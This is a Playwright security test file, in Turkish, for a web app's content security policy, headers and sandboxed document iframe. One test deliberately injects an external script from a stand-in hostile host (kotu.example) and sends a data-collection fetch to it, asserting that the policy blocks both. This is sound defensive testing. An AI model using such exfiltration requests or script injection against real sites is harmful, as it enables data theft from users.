import { expect, test, type Page } from "@playwright/test";

/**
 * SEC-10/15: web güvenlik başlıkları. Uygulamanın kendi işleyişi CSP ihlali
 * üretmez (Next betikleri, tema betiği, belge çerçevesindeki satır içi karekod
 * betiği, e-postadaki uzak görsel); nonce'suz satır içi betik, dış betik ve
 * dışarıya istek engellenir.
 */
async function ihlalleriTopla(page: Page) {
  await page.addInitScript(() => {
    (window as unknown as { __csp: string[] }).__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => (window as unknown as { __csp: string[] }).__csp.push(`${e.violatedDirective} ${e.blockedURI}${e.blockedURI === "eval" ? ` @ ${e.sourceFile}:${e.lineNumber}:${e.columnNumber}` : ""}`));
  });
}
const ihlaller = (page: Page) => page.evaluate(() => (window as unknown as { __csp: string[] }).__csp);

async function apiTaklidi(page: Page) {
  await page.addInitScript(() => sessionStorage.setItem("tekir_access", "e2e-token"));
  await page.route("**/api/v1/**", async (route) => {
    const yol = new URL(route.request().url()).pathname;
    let json: unknown = [];
    if (yol.endsWith("/auth/ben")) json = { userId: "u1", tenantId: "t1", rol: "yonetici" };
    else if (yol.endsWith("/eposta/gelen")) json = { toplam: 1, sayfa: 1, adet: 20, sayfaSayisi: 1, satirlar: [eposta] };
    else if (yol.endsWith("/eposta/gelen/e1")) json = eposta;
    else if (yol.endsWith("/ebelge/uygulamalar")) json = { efatura: { acik: false }, earsiv: { acik: false }, eirsaliye: { acik: false } };
    await route.fulfill({ json });
  });
  // E-postadaki uzak görsel: ağa çıkmadan küçük bir PNG döner.
  await page.route("https://gorsel.ornek.com/**", (route) => route.fulfill({ contentType: "image/png", body: Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+ip1sAAAAASUVORK5CYII=", "base64") }));
}

const eposta = {
  id: "e1", mesajId: "<m1@ornek.com>", gonderenAdi: "Müşteri", gonderenEposta: "a@ornek.com", aliciEposta: "satis@tekir.com",
  konu: "Teklif", icerikMetin: "Merhaba", icerikHtml: `<p>Merhaba</p><img id="logo" src="https://gorsel.ornek.com/logo.png" alt="logo">`,
  tarih: "2026-11-01T10:00:00Z", okundu: true, durum: "yeni", cariId: null, crmFirsatId: null, faturaId: null, cari: null, ekler: [], teklifIslemi: null, teklifBelge: null,
};

test("güvenlik başlıkları her sayfada; giriş sayfası ihlalsiz", async ({ page }) => {
  await ihlalleriTopla(page);
  const yanit = await page.goto("/giris");
  const b = yanit!.headers();
  expect(b["content-security-policy"]).toContain("object-src 'none'");
  expect(b["content-security-policy"]).toContain("frame-ancestors 'self'");
  const scriptSrc = /script-src ([^;]*)/.exec(b["content-security-policy"])![1];
  expect(scriptSrc).toMatch(/'nonce-[A-Za-z0-9+/=]+'/);
  expect(scriptSrc).not.toContain("'unsafe-inline'");
  const ikinci = await page.request.get("/giris");
  expect(ikinci.headers()["content-security-policy"]).not.toBe(b["content-security-policy"]);
  expect(b["x-frame-options"]).toBe("SAMEORIGIN");
  expect(b["x-content-type-options"]).toBe("nosniff");
  expect(b["x-powered-by"]).toBeUndefined();
  await expect(page.getByRole("button", { name: /Giriş/ }).first()).toBeVisible();
  expect(await ihlaller(page)).toEqual([]);
});

test("panel ve gelen e-posta (uzak görsel) ihlalsiz çalışır", async ({ page }) => {
  await ihlalleriTopla(page);
  await apiTaklidi(page);
  await page.goto("/panel/eposta?id=e1");
  const govde = page.locator(".email-body-content");
  await expect(govde.getByText("Merhaba")).toBeVisible();
  await expect.poll(() => govde.locator("#logo").evaluate((g: HTMLImageElement) => g.naturalWidth)).toBe(1);
  expect(await ihlaller(page)).toEqual([]);
});

test("belge çerçevesinde satır içi betik çalışır ama sayfaya ve dışarıya ulaşamaz; sayfada nonce'suz betik çalışmaz", async ({ page }) => {
  await ihlalleriTopla(page);
  await apiTaklidi(page);
  await page.goto("/panel/eposta?id=e1");
  await expect(page.locator(".email-body-content").getByText("Merhaba")).toBeVisible();
  const sonuc = await page.evaluate(async () => {
    const belge = `<html><body><div id="k"></div><script>
      window.onload = function () {
        document.getElementById("k").textContent = "karekod";
        var erisim = "engellendi";
        try { if (parent.document) erisim = "ulasti"; } catch (e) {}
        var depo = "engellendi";
        try { sessionStorage.getItem("tekir_access"); depo = "ulasti"; } catch (e) {}
        var kip = document.compatMode;
        fetch("/api/v1/auth/ben").then(function () { return "gitti"; }, function () { return "engellendi"; }).then(function (istek) {
          parent.postMessage({ tur: "sonuc", erisim: erisim, depo: depo, istek: istek, kip: kip }, "*");
        });
      };
    <\/script></body></html>`;
    const iframe = document.createElement("iframe");
    iframe.setAttribute("sandbox", "allow-scripts");
    iframe.src = "/belge-cerceve.html";
    const mesaj = new Promise<unknown>((ok) => window.addEventListener("message", (e) => {
      if (e.source !== iframe.contentWindow) return;
      if (e.data?.tur === "belge-cerceve-hazir") iframe.contentWindow!.postMessage({ tur: "belge-cerceve-icerik", html: belge }, "*");
      if (e.data?.tur === "sonuc") ok(e.data);
    }));
    document.body.appendChild(iframe);
    const cerceve = await Promise.race([mesaj, new Promise<string>((ok) => setTimeout(() => ok("zaman asimi"), 5000))]);
    const satirIci = document.createElement("script");
    satirIci.textContent = "window.__satirIci = true";
    document.head.appendChild(satirIci);
    const disBetik = await new Promise<string>((ok) => { const s = document.createElement("script"); s.src = "https://kotu.example/x.js"; s.onload = () => ok("yuklendi"); s.onerror = () => ok("engellendi"); document.head.appendChild(s); });
    const disIstek = await fetch("https://kotu.example/topla?veri=1").then(() => "gitti", () => "engellendi");
    return { cerceve, satirIci: Boolean((window as unknown as { __satirIci?: boolean }).__satirIci), disBetik, disIstek };
  });
  expect(sonuc).toEqual({
    cerceve: { tur: "sonuc", erisim: "engellendi", depo: "engellendi", istek: "engellendi", kip: "CSS1Compat" },
    satirIci: false,
    disBetik: "engellendi",
    disIstek: "engellendi",
  });
  const kayit = await ihlaller(page);
  expect(kayit.some((i) => i.startsWith("script-src") && i.includes("inline"))).toBe(true);
  expect(kayit.some((i) => i.startsWith("script-src") && i.includes("kotu.example"))).toBe(true);
  expect(kayit.some((i) => i.startsWith("connect-src") && i.includes("kotu.example"))).toBe(true);
  expect(kayit.filter((i) => !i.includes("kotu.example") && !i.includes("inline"))).toEqual([]);
});

test("belge önizlemesi ekranı karekod betiğini çalıştırır, yeni görünümle içerik yenilenir, CSP ihlali olmaz", async ({ page }) => {
  await ihlalleriTopla(page);
  await page.addInitScript(() => sessionStorage.setItem("tekir_access", "e2e-token"));
  const gorunum = (ad: string) => `<!doctype html><html><body><div id="k">bekliyor</div><script>window.onload = function () { document.getElementById("k").textContent = "karekod ${ad}"; };</script></body></html>`;
  await page.route("**/api/v1/**", async (route) => {
    const yol = new URL(route.request().url()).pathname;
    if (yol.endsWith("/auth/ben")) return route.fulfill({ json: { userId: "u1", tenantId: "t1", rol: "yonetici" } });
    if (yol.endsWith("/baglantilar")) return route.fulfill({ json: [{ id: "b1", aile: "ebelge", saglayici: "nes", durum: "aktif", ortam: "test" }] });
    if (yol.endsWith("/tasarimlar")) return route.fulfill({ json: { destekleniyor: true, secili: "t1", tasarimlar: [{ id: "t1", baslik: "Birinci", varsayilan: true }, { id: "t2", baslik: "İkinci", varsayilan: false }] } });
    if (yol.endsWith("/tasarimlar/onizle")) {
      const { tasarimId } = route.request().postDataJSON() as { tasarimId: string };
      return route.fulfill({ json: { belgeNo: "SNC1", html: gorunum(tasarimId) } });
    }
    if (yol.endsWith("/ebelge/uygulamalar")) return route.fulfill({ json: { efatura: { acik: true }, earsiv: { acik: true }, eirsaliye: { acik: true } } });
    return route.fulfill({ json: [] });
  });
  await page.goto("/panel/ayarlar/entegratorler");
  const onizleDugmeleri = page.getByRole("button", { name: /Önizle/ });
  await onizleDugmeleri.first().click();
  const cerceve = page.frameLocator('iframe[title="Tasarım önizlemesi"]');
  await expect(cerceve.locator("#k")).toHaveText("karekod t1");
  await onizleDugmeleri.nth(1).click();
  await expect(cerceve.locator("#k")).toHaveText("karekod t2");
  expect(await ihlaller(page)).toEqual([]);
});
